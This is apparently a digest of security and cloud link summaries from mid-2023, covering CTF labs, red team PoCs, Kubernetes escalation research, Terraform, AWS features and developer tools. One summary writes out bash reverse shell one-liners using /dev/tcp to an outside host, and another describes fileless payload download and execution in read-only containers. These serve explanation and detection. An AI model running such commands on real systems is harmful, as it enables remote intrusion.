    • Alternatives suggested: IPv6 adoption, load balancers and NAT gateways instead of per-instance public IPs, and EC2 Instance Connect Endpoint for admin access.

    Takeaway: At $0.005 per hour, each public IP costs about $3.60 a month. Run Public IP Insights and remove unneeded public addresses.

06.07.2023

  • awesome-sec-challenges: Curated List of Awesome Security Challenges
    summary

    TL;DR: A CC0 curated list by Mike Privette (Return On Security) of online security challenges for upskilling in ethical hacking, pentesting and cryptography.

    • CTF sections: AI/ML CTFs, cloud-focused CTFs, CTF platforms, vulnerable platforms and introductory education.
    • Cloud examples: CloudFoxable, CloudGoat, Doyensec CloudSec Tidbits, Azure CONVEX.
    • Other sections: Cryptography challenges and Web3.
    • Size: A few dozen entries; about 210 stars, last updated November 2024.

    Takeaway: A compact starting point to find practice environments, especially the cloud-focused CTFs.

  • Introducing CloudFoxable: A Gamified Cloud Hacking Sandbox
    summary

    TL;DR: Seth Art of Bishop Fox introduces CloudFoxable (2023), an intentionally vulnerable AWS environment deployed with Terraform into your own account, built to teach AWS pentesting and show off the CloudFox tool.

    • Inspiration: CloudGoat, flaws.cloud and Metasploitable; CTF format with hints and a public scoreboard.
    • Design: Many distinct vulnerable resources and flags, rewarding new entry points, lateral movement paths and data access.
    • Starter challenges: “It’s a Secret” (read a Secrets Manager flag as ctf-starting-user), “It’s Another Secret” (assume a role first), “Backwards” (find who can access a resource).
    • Advanced challenges: Recreations of attack paths Bishop Fox exploited on real cloud pentests, from single-permission privilege escalation to multi-step chains.
    • Observation: Easy-to-exploit paths are more common in real tests than complex ones.

    Takeaway: A good hands-on lab for AWS attack paths. Deploy it only into an isolated playground account and destroy it afterwards.

  • redteam-research: PoC and Offensive Techniques Used by the BlackArrow Red Team
    summary

    TL;DR: A collection of proof-of-concept code and offensive techniques from the BlackArrow red team (Tarlogic), mostly Windows and Active Directory focused.

    • Contents: Folders for CVE-2018-1685, CVE-2020-1472 (Zerologon), CVE-2026-33829, EDR/AV bypass, Hanshell, LPE via StorSvc and MSSQL linked servers via ADSI.
    • Language: Mostly C.
    • License: The README states MIT for all code, although GitHub detects no license file.
    • Status: About 1,200 stars; still updated in 2026 with new entries.
    • Docs: The top-level README is minimal; each folder documents its own technique.

    Takeaway: Useful reference PoCs for red teams and detection engineers. Review the code before running it, and use it only in authorized environments.

  • Breaking Down Reverse Shell Commands
    summary

    TL;DR: Aditya Telange (May 2023) breaks down how common bash reverse shell one-liners from revshells.com work, focusing on file descriptors and redirection.

    • Basics: FDs 0, 1 and 2 are STDIN, STDOUT and STDERR; custom FDs can be opened too.
    • Bash -i: sh -i >& /dev/tcp/10.10.10.10/9001 0>&1, where /dev/tcp/host/port makes bash open a TCP socket and 0>&1 merges input with output.
    • Bash 196: 0<&196; exec 196<>/dev/tcp/...; sh <&196 >&196 2>&196 opens a read-write FD 196 and binds all three streams to it.
    • Read line: exec 5<>/dev/tcp/...; cat <&5 | while read line; do $line 2>&5 >&5; done executes each received line.
    • Bash 5: sh -i 5<> /dev/tcp/... 0<&5 1>&5 2>&5; the post also lists a UDP variant.

    Takeaway: Understanding these redirections helps both attackers adapt payloads and defenders write detections for /dev/tcp use.

  • Kubernetes Grey Zone: Risks in Managed Cluster Middleware
    summary

    TL;DR: Wiz research by Shay Berkovich (June 2023) on “managed cluster middleware” (CSP add-ons in AKS, EKS and GKE), its security posture, two privilege escalation scenarios presented at KubeCon EU 2023, and which mitigations work.

    • Definition: Components that talk to kube-apiserver but are neither core control plane nor workloads, e.g. GKE container-watcher, AKS osm-controller, EKS aws-node.
    • Footprint (default v1.25): GKE 5 deployments and 4 DaemonSets, AKS 6 and 7, EKS 1 and 2; Wiz says about 83% of its Kubernetes customers use AKS, EKS or GKE.
    • Posture: Of 25 components, 32% share host namespaces, 32% are privileged or have added capabilities, and 32% mount sensitive host volumes; RBAC was not over-privileged.
    • Attack 1: Write access to Node Problem Detector custom plugin directories gives periodic root code execution on the node.
    • Attack 2: Updating a Fluent Bit ConfigMap with an EXEC plugin gives persistent, cluster-wide execution with little audit trail.
    • Mitigations: PSA does not work because kube-system is exempt; non-root containers, moving add-ons out of kube-system where configurable, and CSP image minification do help.

    Takeaway: Managed add-ons are a shared-responsibility gap. Restrict who can edit kube-system ConfigMaps and watch for changes to them.

  • My AWS Pentest Methodology
    summary

    TL;DR: Lizzie Moratti (June 2023), a pentester and former Rhino Security Labs project manager, describes how she approaches assumed-breach AWS penetration tests, as distinct from configuration reviews.

    • Scoping: Ask per account for a ReadOnly key and console login, keys with typical developer or application (EC2/Lambda execution role) permissions, and an architecture diagram; follow AWS pentest rules.
    • Mapping: Whoami, then enumerate with Pacu, CloudFox or enumerate-iam; review user, group and role managed and inline policies; check for Organizations and SCPs.
    • Scanning: Run both ScoutSuite and Prowler with the ReadOnly profile, since their checks differ; budget at least a day to triage false positives.
    • Single service review: Research each service with hackingthe.cloud, cloudvulndb.org and breaches.cloud, e.g. Lambda roles with iam:PutUserPolicy.
    • Framing: “Cloud configuration reviews” are often sold as pentests; they are valuable but not equivalent.
    • Source caveat: Medium blocked direct fetching; summary based on a Wayback Machine copy of the first sections.

    Takeaway: A practical structure for AWS assessments. Ask for both ReadOnly and realistic foothold credentials up front.

  • Executing Arbitrary Code & Executables in Read-Only FileSystems
    summary

    TL;DR: WithSecure Labs research by Golan Myers (June 2023) showing three ways to run arbitrary code in Kubernetes pods with readOnlyRootFilesystem: true and noexec writable mounts.

    • Method 1 (bash present): Define a bash function that downloads over /dev/tcp, then pipe a binary straight into DDexec.sh, which hijacks an existing process in memory so nothing touches disk.
    • Method 2 (no bash, e.g. Alpine): Use busybox wget and the writable but noexec /dev/shm tmpfs, running the payload through sh from an executable mount.
    • Method 3: Execute a binary without execute permission by invoking the dynamic loader directly, e.g. /lib/ld-musl-x86_64.so.1.
    • Assumptions: Low-privileged foothold, no curl or wget; demonstrated with simple reverse shells against nginx and Alpine pods.
    • Conclusion: Read-only filesystems are recommended but not sufficient; layer restrictions, monitoring and alerting such as Falco and SELinux.
    • Source caveat: The original URL now redirects to the W/Labs index; summary based on a Wayback Machine copy.

    Takeaway: Keep readOnlyRootFilesystem, but add runtime detection for in-memory execution and loader abuse rather than treating it as a boundary.

  • Terraform 1.5 Brings Config-Driven Import and Checks
    summary

    TL;DR: HashiCorp’s announcement (12 June 2023) of Terraform 1.5, which adds config-driven import blocks and check blocks for continuous validation.

    • Old pain: terraform import worked one resource at a time, changed state with no preview, and needed hand-written matching config.
    • Import block: Top-level import { id = "<cloud id>" to = aws_instance.example }, planned and applied like normal changes, so imports can be previewed and bulked.
    • Config generation: terraform plan -generate-config-out=<file> writes matching resource blocks for review.
    • Check block: Top-level validation of infrastructure, with multiple assert blocks (condition and error_message) that can reference any resource, data source or output.
    • Non-blocking: Checks run at the end of plan and apply and only warn on failure, unlike Terraform 1.2 postconditions which halt.
    • Scoped data source: A check can include one nested data source, e.g. an http call asserting a load balancer returns 200, whose errors stay inside the check.

    Takeaway: Use import blocks instead of the CLI for brownfield adoption, and check blocks for health assertions that should not block deploys.

  • Vault Secrets Operator for Kubernetes Now GA
    summary

    TL;DR: HashiCorp (Rich DuBose, 13 June 2023) announces general availability of the Vault Secrets Operator (VSO), a Kubernetes operator that syncs Vault secrets into native Kubernetes Secrets.

    • Model: A controller reconciles VSO custom resources such as VaultConnection, VaultAuth, VaultDynamicSecret and VaultPKISecret into Kubernetes Secrets.
    • Auth methods at GA: Kubernetes, JWT, AppRole and AWS; the March 2023 beta supported only Kubernetes.
    • Dynamic secrets: Example VaultDynamicSecret pulls database credentials from creds/postgres into a Secret.
    • Platforms: Validated on AKS, GKE, EKS and OpenShift.
    • Cleanup: On operator deletion it can revoke cached Vault client tokens and purge cached storage.
    • Install: Helm chart from https://helm.releases.hashicorp.com or Kustomize from the GitHub repo.

    Takeaway: VSO lets apps keep reading plain Kubernetes Secrets while Vault stays the source of truth. Remember the synced values then live in etcd, so encrypt it.

  • Secure Connectivity from Public to Private: Introducing EC2 Instance Connect Endpoint
    summary

    TL;DR: An AWS Compute Blog post (14 June 2023) launching EC2 Instance Connect (EIC) Endpoint, an identity-aware TCP proxy for SSH or RDP to private instances without public IPs, internet gateways, bastion hosts or agents.

    • How it works: The AWS CLI opens a WebSocket tunnel to the endpoint using IAM credentials; you then point your normal client at 127.0.0.1, or use the console.
    • Command: aws ec2-instance-connect open-tunnel --instance-id ..., usable as an SSH ProxyCommand.
    • No IGW or NAT: The VPC does not need direct internet connectivity, and no agent is needed on the target, so it also works for third-party appliances.
    • Controls: IAM policies plus security groups govern who can connect to which instance and port; authentication happens before traffic enters the VPC.
    • Logging: CloudTrail records the IAM principal, source IP, destination IP and port; optional client IP preservation.
    • Comparison: Combines with EC2 Instance Connect ephemeral SSH keys, which previously needed a public IP; Systems Manager Session Manager remains the agent-based alternative.

    Takeaway: A strong option to retire bastion hosts. Scope the IAM permissions and endpoint security groups tightly, since this opens a path from public space into private subnets.

  • AWS IAM Identity Center Now Supports Automated User Provisioning from Google Workspace
    summary

    TL;DR: An AWS What’s New post (13 June 2023): AWS IAM Identity Center now supports automated user provisioning from Google Workspace, alongside SAML sign-in.

    • Feature: Google auto-provisioning creates users in IAM Identity Center automatically instead of manual or scripted sync.
    • Sign-in: Users sign in with Google Workspace identities to the AWS console, AWS CLI and the Identity Center portal.
    • Setup: Use the AWS cloud application in Google’s pre-integrated app catalog to configure both SAML and auto-provisioning.
    • Management: Admins assign access to AWS Organizations accounts and applications centrally in Identity Center.
    • Availability: All Regions supported by IAM Identity Center.

    Takeaway: If you use Google Workspace, this replaces third-party sync tools such as ssosync for users. Check whether groups are covered for your setup before switching.

  • Generally Available: Managed Identity Authentication in Azure Monitor Container Insights
    summary

    TL;DR: An Azure update (13 June 2023) announcing general availability of managed identity authentication for Azure Monitor Container Insights.

    • Change: The monitoring agent uses the cluster’s managed identity to send data to Azure Monitor, replacing legacy certificate-based local authentication.
    • Simplification: Removes the need to grant the cluster the Monitoring Metrics Publisher role.
    • Identity types: Both system-assigned and user-assigned managed identities are supported.
    • Default: Managed identity becomes the default for Container Insights, and customers are encouraged to migrate.
    • Migration: Guidance covers existing AKS clusters and Azure Arc-enabled clusters.
    • Source caveat: The original URL now redirects to an empty Azure Updates listing; summary based on a Wayback Machine copy.

    Takeaway: Migrate AKS and Arc clusters off certificate-based Container Insights auth to remove a long-lived credential.

  • Millions of GitHub Repos Likely Vulnerable to RepoJacking, Researchers Say
    summary

    TL;DR: BleepingComputer (Bill Toulas, 22 June 2023) reports Aqua Security Nautilus research estimating that about 9 million GitHub repositories may be vulnerable to RepoJacking.

    • Numbers: In a sample of 1.25 million repos, about 2.95% were vulnerable; extrapolated to GitHub’s 300 million+ repos, about 9 million.
    • Attack: After an organization or user is renamed, an attacker registers the old name and repo, breaking GitHub’s redirect so dependents fetch attacker code.
    • GitHub defenses: Retired-namespace protection covers only popular projects, e.g. repos with over 100 clones in the week before a rename, and Aqua says it is incomplete and easy to bypass.
    • Google example: A Mathsteps README pointed to a repo of Socratic, acquired in 2018, with an npm install step that could run attacker code.
    • Lyft example: An install.sh script fetched a ZIP from a hijackable “YesGraph/Dominus” repository.
    • Advice: Minimize resources fetched from external repos and keep control of old brand or acquired org names.

    Takeaway: Grep your build scripts and READMEs for raw GitHub URLs and pin or vendor them. Keep old org names registered after renames.

  • AWS CloudTrail Cheat Sheet
    summary

    TL;DR: Invictus Incident Response (June 2023) publishes a cheat sheet of “interesting” AWS CloudTrail event names for incident responders and detection engineers, organized by MITRE ATT&CK phase.

    • Scope: Uses the CloudTrail eventName field to identify events, covering management (control plane) and data (data plane) events.
    • Method: Built from real AWS incident response cases, attacks simulated with Stratus Red Team, and brainstorming for gaps.
    • Format: The sheet itself is an image grouped by ATT&CK tactic, with a GitHub page for suggesting additions.
    • Disclaimer: The authors say it is not a definitive guide to all malicious activity.
    • Source caveat: Medium blocked direct fetching; summary based on a Wayback Machine copy of the post, whose cheat sheet content is in an image not readable as text.

    Takeaway: Use the event list as a seed for CloudTrail triage queries and detections, then extend it from your own environment.

  • Go 1.21 Release Candidate
    summary

    TL;DR: The Go blog announces the Go 1.21 release candidate (go1.21rc2, since rc1 was retagged after a bug), previewing the features of the August 2023 release.

    • PGO GA: Profile-guided optimization is generally available; a default.pgo file in the main package directory enables it, with measured gains of 2-7%.
    • Language: New built-ins min, max and clear; improved generic type inference; a preview of the loop variable capture fix behind an environment variable (LoopvarExperiment).
    • Standard library: New log/slog structured logging, plus slices, maps and cmp packages.
    • Performance: The compiler itself is built with PGO and builds programs 2-4% faster; GC tuning can cut tail latency by up to 40%; runtime/trace is much cheaper on amd64 and arm64.
    • WASI: Experimental GOOS=wasip1 GOARCH=wasm port and the go:wasmimport directive.
    • Toolchain: The go command gains backward and forward language compatibility support.

    Takeaway: Go 1.21 is the release where slog, slices and PGO became standard. Upgrade-planning notes still apply to any codebase that predates it.

  • dkron: Distributed, Fault Tolerant Job Scheduling System
    summary

    TL;DR: Dkron is a distributed, fault-tolerant cron service written in Go that uses Raft and Serf to run scheduled jobs across a cluster with no single point of failure.

    • Repo move: The distribworks/dkron URL now redirects to dkron-io/dkron; it is still active in 2026 with about 4,700 stars.
    • Design: Raft for consensus and Serf gossip for membership, inspired by Google’s “Reliable Cron across the Planet” paper and Airbnb Chronos.
    • Features: Web UI, high job volumes across thousands of nodes, jobs targeted at any combination of servers.
    • Platforms: Linux, macOS and Windows.
    • Quickstart: docker compose up -d, UI at http://localhost:8080/ui; scale with docker compose up -d --scale dkron-server=4 --scale dkron-agent=10.
    • License: LGPL-3.0; jobs are managed through a REST API.

    Takeaway: A self-hosted option when Kubernetes CronJobs or a single cron host are not enough. Check which features sit in the open-source edition before committing.

  • tailer: CLI Tool to Insert Lines When Command Output Stops
    summary

    TL;DR: tailer is a small MIT-licensed Go CLI that prints a separator line whenever a command’s output pauses, making bursts in log streams easy to see. It is a Go port of samwho/spacer.

    • Install: go install github.com/hionay/tailer/cmd/tailer@latest.
    • Pipe or exec: Pipe output into it, or run tailer exec "python3 -m http.server 9300" without a pipe.
    • Options: --after (-a) sets the idle duration before a line, default 1s; --dash (-d) sets the line character, default ─; --no-color.
    • Status: About 130 stars; last commit July 2023.

    Takeaway: A tiny quality-of-life tool for tail -f and dev servers. It has not been updated since 2023, which matters little at this size.

  • lingua-go: Accurate Natural Language Detection Library for Go
    summary

    TL;DR: Lingua-go, by pemistahl, is an Apache 2.0 Go library for offline natural language detection that aims for high accuracy on short texts and mixed-language text across 75 languages.

    • Method: Rule-based alphabet filtering first, then n-gram models of sizes 1 to 5, instead of the usual trigrams only; no dictionaries and no external API.
    • Benchmarks: Compared against Whatlanggo and Google’s CLD3 (via gocld3) on Leipzig Wortschatz corpora; e.g. German averages 89.23%, with 73.90% on single words, 94.10% on word pairs and 99.70% on sentences.
    • Memory: About 1,800 MB with all models in high accuracy mode, about 110 MB in WithLowAccuracyMode(), which loses accuracy below 120 characters.
    • Tuning: Restrict the candidate languages, set a minimum relative distance, read confidence values, and choose eager (WithPreloadedLanguageModels()) or lazy loading.
    • Install: go get github.com/pemistahl/lingua-go; requires Go 1.18+.
    • Status: About 1,400 stars; last push February 2025.

    Takeaway: A strong choice for language routing or filtering in Go. Budget for the memory use or limit the language set.

  • try: Inspect a Command’s Effects Before Modifying Your Live System
    summary

    TL;DR: try, from the binpash project, is an MIT-licensed shell tool that runs a command in a Linux namespace with an overlayfs so you can inspect its filesystem changes before committing them to the live system.

    • Usage: try pip3 install libdash runs the command, shows the changes and asks whether to commit them.
    • Deferred commit: try -n "curl https://sh.rustup.rs | sh" prints the overlay directory instead of committing; try -N dir reuses a sandbox dir and try summary dir lists changes.
    • Mechanism: unshare user namespaces plus overlayfs; falls back to mergerfs or unionfs-fuse with -U for nested mounts; needs Linux 5.11+.
    • Limits: The README says it is a “semisolate”, not a full sandbox: network calls are allowed, so it should not run untrusted commands.
    • Install: Single try script on PATH, or autoconf && ./configure && make && sudo make install, plus AUR and nixpkgs packages.
    • Recognition: About 5,500 stars; the README reports a best paper and distinguished artifact award at OSDI ‘26.

    Takeaway: Useful for previewing what installers and scripts change on disk. Do not treat it as a security sandbox for untrusted code.

  • deepsecrets: Secrets Scanner That Understands Code
    summary

    TL;DR: DeepSecrets is a secrets scanner, originally from Avito, that combines regex rules with code lexing and semantic analysis to cut false positives. The Avito repo is frozen; development moved to the creator’s fork ntoskernel/deepsecrets, now an OWASP project.

    • Repo status: The avito-tech README warns it will receive no updates; the fork was still active in October 2026.
    • Approach: Semantic code analysis, dangerous variable detection and context-aware entropy checks across 500+ languages and formats.
    • HashedSecret engine: Supply hashes of known production secrets and it finds them in plain text without you sharing the secrets.
    • Benchmarks (fork, self-reported): On SecretBench (June 2026), 93% recall and 8% false positive rate.
    • Usage: pip install deepsecrets (Python 3.11+), then deepsecrets --target-dir /path --outformat dojo-sarif --outfile report.json.
    • Options: Custom regex rules, --hashed-values, exclusions, --confidence-level, CI mode, masking on by default.

    Takeaway: Use the ntoskernel fork, not the Avito URL. The hashed-secrets feature is a good fit for checking whether known production credentials leaked into code.

  • jsluice: Extract URLs, Paths, Secrets, and Other Interesting Bits from JavaScript
    summary

    TL;DR: jsluice is an MIT-licensed Go package and CLI from Bishop Fox that parses JavaScript with tree-sitter to extract URLs, paths, secrets and other interesting data, going beyond regex scraping.

    • Install: go install github.com/BishopFox/jsluice/cmd/jsluice@latest, or go get github.com/BishopFox/jsluice as a library.
    • URL extraction: Finds URLs where they are used, e.g. document.location assignments, window.open() and fetch(), and reports method, query and body params.
    • String concatenation: Replaces unknown expressions with EXPR, e.g. /login?redirect=EXPR&method=oauth, recovering params a naive regex would miss.
    • Secrets: Built-in secret matchers plus AddSecretMatcher with tree-sitter queries for custom patterns.
    • Extensibility: AddURLMatcher for custom node types (string, assignment_expression, call_expression).
    • Status: About 2,000 stars; last push May 2024.

    Takeaway: A strong addition to web recon pipelines for mining endpoints from JS bundles. Feed its output into your crawler or fuzzer.

  • threat-composer: Threat Modeling Tool to Reduce Time-to-Value When Threat Modeling
    summary

    TL;DR: Threat Composer is an Apache 2.0 threat modeling tool from AWS Labs that helps teams write structured threat statements and track assumptions and mitigations; it has grown into a small ecosystem since 2023.

    • Threat grammar: Composes threats with a structured grammar and adaptive suggestions, with full examples.
    • Features: Architecture and data flow diagrams, assumption tracking linked to threats and mitigations, insights dashboard, reusable threat and mitigation packs.
    • Formats: Exports to JSON, Markdown, DOCX and PDF; JSON works well in Git for “living” threat models.
    • Web app: Live demo on GitHub Pages, or self-host in your own AWS account; data stays in browser storage.
    • Newer additions: An experimental AI CLI and MCP server that analyze code with Amazon Bedrock to generate a starter model (Bedrock costs apply), and a VS Code extension.

    Takeaway: A free, practical way to start threat modeling with consistent statements. Keep the JSON model in the repo next to the code it describes.

  • PentestGPT: GPT-Empowered Penetration Testing Tool
    summary

    TL;DR: PentestGPT is an MIT-licensed LLM-driven penetration testing tool by Gelei Deng and colleagues, published at USENIX Security 2024. It started as a GPT-4 guided assistant in 2023 and v1.0 is now an autonomous agent.

    • Current design: A multi-stage pipeline: recon, exploit and walkthrough for CTFs; asset discovery, vulnerability identification and report for pentests.
    • Backends: The autonomous mode drives Claude Code or Codex CLIs; a “legacy” interactive mode supports OpenAI, Anthropic, Gemini, DeepSeek, xAI, Qwen, Moonshot and local Ollama.
    • Usage: pentestgpt --target 10.10.11.234, --instruction "..." for context, --mode pentest, --list-sessions for saved sessions.
    • Categories: Web, crypto, reversing, forensics, PWN and privilege escalation.
    • Install: Python 3.12+, uv, make install, or a Docker image bundling both CLIs.
    • Status: About 16,000 stars; active in 2026. The README now differs substantially from the 2023 version linked here.

    Takeaway: Interesting for CTF practice and research on agentic pentesting. Run it only against targets you are authorized to test and review every action it takes.

  • GPT-4 Outperforms Humans in Pitch Deck Effectiveness Among Investors and Business Owners
    summary

    TL;DR: A 2023 marketing study by Clarify Capital, a business financing company, claiming investors and business owners rated GPT-4 generated pitch decks far more convincing than successful human-made decks.

    • Method: GPT-4 was prompted to create decks per industry; 250 investors and 250 business owners rated them against human decks that had already secured funding, without knowing AI was involved.
    • Headline numbers: 80% found GPT-4 decks convincing vs 39% for human decks; respondents were 3x more likely to invest after a GPT-4 deck; 1 in 5 would invest $10,000 or more.
    • Finance: 88% more likely to find GPT-4 decks convincing; 34% investment rate vs 16%.
    • Marketing: 73% more likely convincing; quality 75% vs 32%; willingness to invest 35% vs 12%.
    • Tech: 70% more convincing; 37% vs 11% willing to invest.
    • Demographics: 68% men, 31% women, 1% undisclosed; no further methodology or independent replication published.
    • Source caveat: The live page returned a Cloudflare challenge; summary based on a gwern.net mirror of the page.

    Takeaway: Treat it as vendor content marketing, not research. At most it suggests LLM drafts are a reasonable starting point for pitch materials.

  • security-interview-questions: Security Interview Questions for AppSec, Pentesting, Cloud Security and More
    summary

    TL;DR: A community collection by GitHub user jassics of security interview questions with suggested explanations for roles such as AppSec, pentesting, cloud security, DevSecOps and network security.

    • Organization: Separate files per role and level, e.g. Application Security, API Security, Web Security/Pentest and Security Architect scenarios, cross-linked rather than duplicated.
    • AppSec file: SDLC-centric questions on secure code review, threat modeling and crypto basics, plus a code review round with vulnerable snippets.
    • API file: OWASP API Security Top 10, JWT, OAuth2, mTLS, GraphQL and gRPC authorization, with 8 scenario questions.
    • Web/pentest file: SOP, CORS, CSP, OWASP Top 10 exploit internals, session attacks and methodology.
    • Status: About 500 stars; still updated in 2026; no license file.

    Takeaway: Useful for both candidates and interviewers; the “what to listen for” guidance helps standardize interviews.

  • awesome-aws-security: Curated List of Links, References, Books, and Tutorials on AWS Security
    summary

    TL;DR: A GPL-3.0 curated list by jassics of AWS security resources: whitepapers, books, videos, tutorials, courses, tools, CTFs, security bulletins and breaches.

    • Sections: AWS whitepapers, books, videos, online tutorials and blogs, paid and free courses, tools, practice labs and CTFs, AWS security bulletins and notable breaches.
    • Related repos: Links to the author’s cloud security learning resources, AWS security study plan, AWS interview questions, cloud security roadmap and slides.
    • Bulletins: Recommends bookmarking the AWS Security Bulletins page.
    • Status: About 1,600 stars; updated in September 2026.

    Takeaway: A broad index for building an AWS security study plan. Quality varies by entry, so treat it as a starting point.

  • NSA: Defending Continuous Integration/Continuous Delivery (CI/CD) Environments
    summary

    TL;DR: A joint NSA and CISA Cybersecurity Information Sheet (June 2023, TLP:CLEAR) on hardening cloud CI/CD environments, tool-agnostic and mapped to MITRE ATT&CK.

    • Threats: Insecure code, poisoned pipeline execution, insufficient pipeline access controls, insecure system configuration, third-party services and exposed secrets.
    • Scenarios: (1) stolen Git or CI/CD credentials; (2) supply chain compromise of a library, tool or container image; (3) compromise that modifies CI/CD config, IaC, source or dependencies.
    • Access mitigations: NSA-recommended cryptography, minimizing long-term credentials, signing CI/CD config and verifying it, two-person rules for all code updates, least-privilege CI/CD access, securing accounts and secrets, network segmentation.
    • Environment mitigations: Keep CI/CD tools and OSes patched, remove unnecessary applications, deploy EDR.
    • Process mitigations: Security scanning in the pipeline, restricting untrusted libraries, analyzing committed code, removing temporary resources, audit logs, SBOM and SCA, and resiliency testing.
    • Appendix: CI/CD threats mapped to ATT&CK tactics and D3FEND countermeasures; references the OWASP Top 10 CI/CD Security Risks and NIST SP 800-207.
    • Source caveat: The defense.gov URL returns 403 to non-browser clients; summary based on a Wayback Machine copy of the PDF.

    Takeaway: A government-backed checklist to justify CI/CD controls such as 2PR, short-lived credentials and signed pipeline config. Map your pipeline against its three scenarios.

  • Leveraging AWS SSO (aka Identity Center) with Google Workspaces: Version 2
    summary

    TL;DR: Chris Farris (PrimeHarbor, 2023) updates his guide to using Google Workspace as the identity provider for AWS IAM Identity Center (AWS SSO), after AWS added native automatic provisioning from Google.

    • SAML setup: In Identity Center change the identity source to an external IdP; in Google Admin add the “Amazon Web Services” app, copy the ACS URL and issuer URL, set Name ID format to EMAIL, map RoleSessionName to primary email, and upload GoogleIDPMetadata.xml.
    • Safety tip: Make the change as an IAM user to avoid locking yourself out.
    • New provisioning: Copy the SCIM endpoint and access token into Google’s “Configure autoprovisioning”; he sets deprovisioning to hard-delete AWS users when deleted in Google.
    • Big limitation: The Google app syncs users only, not groups, and only users already in Identity Center groups or a provisioning-scope group; enabling SCIM removes console group management.
    • Verdict: He calls the new auto-provisioning too immature and plans to keep the older ssosync method with the new app.
    • Licensing note: Google Cloud Identity users work the same as Workspace users.

    Takeaway: Read this before switching to the native Google provisioning. If you rely on Google groups for access, you still need ssosync or Terraform-managed groups.

  • How to Add, Use, and Update .terraform.lock.hcl Without Pain
    summary

    TL;DR: A guest post by Maksym Vlasov on grem1.in (2023) on why to commit .terraform.lock.hcl files and how to generate and update them across many root modules without pain.

    • Trigger: Terraform 1.4.0 always checks the lockfile before the provider cache, breaking workflows that ignored lockfiles.
    • Security: h1: and zh: hashes pin exact provider artifacts per platform, reducing supply chain risk from providers.
    • Generation: Uses the terraform_providers_lock hook from pre-commit-terraform with -platform=linux_amd64, linux_arm64, darwin_amd64 and darwin_arm64, plus files regexes to split huge repos into batches.
    • Prep: Make every root module pass terraform validate, using terraform init -backend=false, before adding lockfiles.
    • Updates: Automate with Renovate, Dependabot or the tfupdate pre-commit hook; tfupdate forces one version across the codebase.
    • Safety net: Back updates with automated terraform plan in CI (Atlantis, Spacelift, Terraform Cloud or your own).

    Takeaway: Commit lockfiles with hashes for all platforms your team and CI use, and let a bot update them through planned PRs.

  • 8 Terraform Continuous Validation Use Cases for AWS, Google Cloud, and Azure
    summary

    TL;DR: A HashiCorp blog post (26 June 2023, by Sarah French, KT Lynn and Jared Baker) with eight example Terraform check blocks used for continuous validation in Terraform Cloud Plus.

    • Requirements: Terraform 1.5+ check blocks; continuous validation is a Terraform Cloud Plus feature.
    • AWS: Budget not exceeded via aws_budgets_budget (!budget_exceeded); no open GuardDuty findings via aws_guardduty_finding_ids (!has_findings); both need AWS provider 5.2+.
    • Google Cloud: VM current_status == "RUNNING"; Private CA certificate valid 30+ days using timecmp and plantimestamp(); Cloud Function state == "ACTIVE"; Google provider 4.70+.
    • Azure: VM power_state == "running"; App Service certificate expiring within 30 days; Function or Web App usage limit, with examples in the AzureRM repo under examples/tfc-checks/.
    • Note: The Azure usage-limit example as published asserts usage == "Exceeded", which appears inverted relative to its stated intent.

    Takeaway: Borrow these patterns for health and drift assertions even outside Terraform Cloud, since check blocks run on every plan. Double-check the example conditions before copying.

  • terraform-fake-modules: Terraform Fake Modules
    summary

    TL;DR: A Gruntwork repository of “fake” Terraform modules that mimic AWS and GCP resources such as VPC, EKS and Aurora, so you can explore Terraform and Terragrunt behaviour without creating real infrastructure.

    • Behaviour: Modules authenticate to the cloud provider but create no real resources; they generate semi-realistic outputs.
    • Usage: source = "git::https://github.com/gruntwork-io/terraform-fake-modules.git//modules/aws/vpc?ref=main"; the fake EKS module takes vpc_id = module.vpc.id.
    • Terragrunt: Works as a terraform { source = ... } block in terragrunt.hcl.
    • Requirements: Terraform 1.0+, AWS provider 4.0+, optional Terragrunt 0.31+.
    • Maintainers: Members of Gruntwork’s sales team; last push July 2023, about 50 stars.

    Takeaway: Handy for teaching or demoing module wiring and Terragrunt dependency graphs at zero cost. It is not useful for testing real provider behaviour.

  • actions-permissions: GitHub Token Permissions Monitor and Advisor Actions
    summary

    TL;DR: GitHub Security Lab’s public-beta Monitor and Advisor actions help you find the minimal GITHUB_TOKEN permissions a GitHub Actions workflow actually needs.

    • Monitor action: Added to a job, it tracks the temporary token’s API usage and writes a per-run summary recommending minimum permissions.
    • Advisor action: Aggregates Monitor recommendations across multiple runs, since conditional steps may not run every time.
    • Workflow: Add Monitor to every job without explicit permissions, collect several runs, apply the recommended least-privilege permissions: block, then remove Monitor.
    • Motivation: Least privilege is best practice but manual tightening risks breaking workflows.
    • Status: MIT license, about 390 stars, updated January 2026.

    Takeaway: A low-effort way to move workflows from default broad token permissions to explicit minimal ones. Pair it with a repo default of read-only tokens.

  • GKE Security Posture Dashboard Now Generally Available with Enhanced Features
    summary

    TL;DR: Google Cloud (Glen Messenger and Daniel L’Hommedieu, 27 June 2023) announces general availability of the GKE Security Posture dashboard, with misconfiguration detection and vulnerability scanning for GKE clusters.

    • Scale: Supports clusters of up to 1,000 nodes for misconfiguration and OS vulnerability scanning.
    • Security bulletin surfacing (preview): Shows GKE security bulletins that affect a cluster based on its version and configuration, with mitigations, at no extra cost.
    • Defaults: Configuration audits and bulletin surfacing are on by default for new clusters.
    • Autopilot: Container OS vulnerability scanning is on by default for new Autopilot clusters, with no compute charge for the feature.
    • Goal: Reduce the toil of sorting through CVEs by showing only those relevant to your clusters.

    Takeaway: Check that the dashboard is enabled on older GKE clusters, since the defaults only applied to newly created ones.

  • Zed: High-Performance, Multiplayer Code Editor from the Creators of Atom and Tree-sitter
    summary

    (Could not fetch full text.)

    TL;DR: Zed is an open-source, high-performance code editor from Zed Industries, founded by the creators of Atom and Tree-sitter, with built-in multiplayer collaboration. The 2023 launch page has been replaced by the current site.

    • Current pitch: “The world’s fastest IDE. Open source. AI optional.” (Zed, established 2021).
    • New product: The site now also promotes Delta (2026), “a multiplayer environment for coding with agents, powered by DeltaDB”.
    • Tech: The site references its GPUI UI framework and Tree-sitter incremental parsing, both from Zed Industries.
    • Collaboration: Real-time multiplayer editing was a core feature from the start, per the title.
    • Source caveat: Based on the current homepage and the title; the July 2023 page content is no longer available at this URL.

    Takeaway: Zed has changed a lot since 2023 and now pitches AI-optional and agent workflows. Evaluate the current version, not the launch-era claims.

  • GitLab’s AI-Assisted Code Suggestions
    summary

    (Could not fetch full text.)

    TL;DR: The 2023 GitLab Code Suggestions page described GitLab’s AI code completion feature, part of GitLab Duo. The URL now redirects to the GitLab Duo Agent Platform page.

